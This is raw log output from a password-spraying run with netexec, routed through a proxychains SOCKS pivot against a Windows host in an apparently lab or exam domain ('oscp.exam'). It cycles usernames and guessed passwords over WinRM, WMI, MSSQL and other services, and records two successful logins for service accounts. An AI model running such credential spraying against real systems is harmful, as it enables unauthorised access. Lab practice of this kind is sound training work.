[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Mary.Williams:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\support:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\cloudbase-init:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Admin:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\web_svc:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\sql_svc:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Administrator:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Guest:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\DefaultAccount:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\WDAGUtilityAccount:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Mary.Williams:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\support:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\cloudbase-init:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Admin:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\web_svc:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\sql_svc:Dolphin1

[*] Testing wmi ...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Administrator:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Guest:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\DefaultAccount:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\WDAGUtilityAccount:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Mary.Williams:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\support:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\cloudbase-init:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Admin:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\web_svc:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\sql_svc:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Administrator:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Guest:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\DefaultAccount:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\WDAGUtilityAccount:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Mary.Williams:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\support:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\cloudbase-init:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Admin:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\web_svc:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\sql_svc:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Administrator:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Guest:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\DefaultAccount:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\WDAGUtilityAccount:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Mary.Williams:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\support:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\cloudbase-init:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Admin:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [+] oscp.exam\web_svc:Diamond1 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\sql_svc:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Administrator:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Guest:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\DefaultAccount:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\WDAGUtilityAccount:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Mary.Williams:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\support:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\cloudbase-init:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] oscp.exam\Admin:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [+] oscp.exam\sql_svc:Dolphin1 

[*] Testing wmi (local-auth)...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Administrator:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Guest:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\DefaultAccount:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\WDAGUtilityAccount:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Mary.Williams:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\support:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\cloudbase-init:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Admin:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\web_svc:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\sql_svc:December31 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Administrator:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Guest:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\DefaultAccount:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\WDAGUtilityAccount:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Mary.Williams:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\support:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\cloudbase-init:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Admin:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\web_svc:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\sql_svc:Freedom1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Administrator:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Guest:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\DefaultAccount:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\WDAGUtilityAccount:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Mary.Williams:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\support:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\cloudbase-init:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Admin:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\web_svc:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\sql_svc:Diamond1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Administrator:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Guest:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\DefaultAccount:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\WDAGUtilityAccount:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Mary.Williams:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\support:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\cloudbase-init:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\Admin:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\web_svc:Dolphin1 (RPC_S_ACCESS_DENIED)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
RPC         10.10.135.148   135    MS02             [-] MS02\sql_svc:Dolphin1 (RPC_S_ACCESS_DENIED)

[*] Testing rdp ...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:3389 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:3389 <--socket error or timeout!

[*] Testing rdp (local-auth)...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:3389 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:3389 <--socket error or timeout!

[*] Testing ssh ...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:22 <--socket error or timeout!

[*] Testing ssh (local-auth)...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing ldap ...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:389 <--socket error or timeout!

[*] Testing ldap (local-auth)...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing mssql ...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam) (EncryptionReq:False)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Administrator:December31 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Guest:December31 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\DefaultAccount:December31 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\WDAGUtilityAccount:December31 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Mary.Williams:December31 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\support:December31 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\cloudbase-init:December31 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Admin:December31 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\web_svc:December31 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\sql_svc:December31 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Administrator:Freedom1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Guest:Freedom1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\DefaultAccount:Freedom1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\WDAGUtilityAccount:Freedom1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Mary.Williams:Freedom1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\support:Freedom1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\cloudbase-init:Freedom1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
